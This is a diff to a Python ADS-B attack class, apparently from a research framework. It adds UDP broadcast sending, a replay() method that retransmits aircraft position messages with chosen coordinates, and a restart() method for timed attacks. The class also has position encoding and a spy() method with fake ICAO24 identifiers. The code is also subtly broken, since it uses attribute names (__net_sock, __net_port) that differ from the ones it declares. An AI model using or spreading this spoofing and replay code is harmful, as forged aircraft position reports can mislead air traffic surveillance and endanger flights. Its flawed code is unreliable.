@@ -26,10 +26,13 @@ initial release (Linux/Python)
 # < imports >--------------------------------------------------------------------------------------
 
 # python library
+import ipcalc
 import binascii
 import logging
 import math
+import netifaces as ni
 import os
+import socket
 
 from abc import ABCMeta, abstractmethod
 from time import time
@@ -67,6 +70,12 @@ class AbstractAttack(object):
     #
     __b_attack = False
 
+    __net_socket = None
+
+    __i_net_port = 30001
+    __s_net_iface = "eth0"
+
+    __net_dest = None
 
     # ---------------------------------------------------------------------------------------------
     @abstractmethod
@@ -143,6 +152,23 @@ class AbstractAttack(object):
 
 
     # ---------------------------------------------------------------------------------------------
+    def __create_socket(self):
+        """
+
+        :return:
+        """
+        self.__net_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.__net_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+
+        # Resolving broadcast address of primary interface
+        ipaddr = ni.ifaddresses(self.__s_net_iface)[2][0]['addr']
+        netmask = ni.ifaddresses(self.__s_net_iface)[2][0]['netmask']
+        subnet = ipcalc.Network(ipaddr + "/" + netmask)
+
+        self.__net_dest = str(subnet.broadcast())
+
+
+    # ---------------------------------------------------------------------------------------------
     def encode_airborne_position(self, fs_icao24, fi_sv, ff_latitude, ff_longitude, ff_altitude, fs_last_position_msg):
         """
 
@@ -181,7 +207,7 @@ class AbstractAttack(object):
         msg_odd  = AdsbUtils.encode_airborne_position(ldefs.CA, fs_icao24, l_odd_enc_lat, l_odd_enc_lon, fi_sv, ldefs.NIC_SB, ls_enc_alt, ldefs.T_FLAG, 1)
 
         # Alternate through even or odd messages
-        if fs_last_position_msg == ldefs.ODD_MSG:
+        if fs_last_position_msg == ldefs.ODD_TYPE:
             # Send even msg
             return hex(int(msg_even, 2)).rstrip("L").lstrip("0x")
         else:
@@ -333,7 +359,7 @@ class AbstractAttack(object):
 
     # ---------------------------------------------------------------------------------------------
     @abstractmethod
-    def spy(self, fo_adsbOut=None, fdict_aircraft_table=None, flst_icao24_fake=None):
+    def spy(self, fdict_aircraft_table=None, flst_icao24_fake=None):
         """
         Escuta da mensagens ADS-B.
 
@@ -354,6 +380,8 @@ class AbstractAttack(object):
         """
         M_LOG.info (">> AbstractAttack.start")
 
+        self.__create_socket();
+
         self.__i_time_to_attack = fi_time_to_attack
         self.__i_interval_to_attack = fi_interval_to_attack
 
@@ -363,12 +391,31 @@ class AbstractAttack(object):
 
 
     # ---------------------------------------------------------------------------------------------
-    def replay(self, fs_message, fo_adsbOut, fi_delay):
+    def replay(self, fs_message):
         """
         Retransmite a mensagem ADS-B
         :return:
         """
-        raise NotImplementedError()
+        if fs_message is None:
+            return False
+
+        lf_msg = fs_message + " " + str(self.__f_latitude) + " " + str(self.__f_longitude) + " " + str(self.__f_altitude)
+        self.__net_sock.sendto(lf_msg, (self.__net_dest, self.__net_port))
+
+
+    # ---------------------------------------------------------------------------------------------
+    def restart(self):
+        """
+
+        :return:
+        """
+        M_LOG.info(">> AbstractAttack.restart")
+
+        self.__i_time_to_attack = self.__i_interval_to_attack
+        self.__b_attack = False
+        self.__tt_start = time()
+
+        M_LOG.info("<< AbstractAttack.restart")
 
 
     # ---------------------------------------------------------------------------------------------
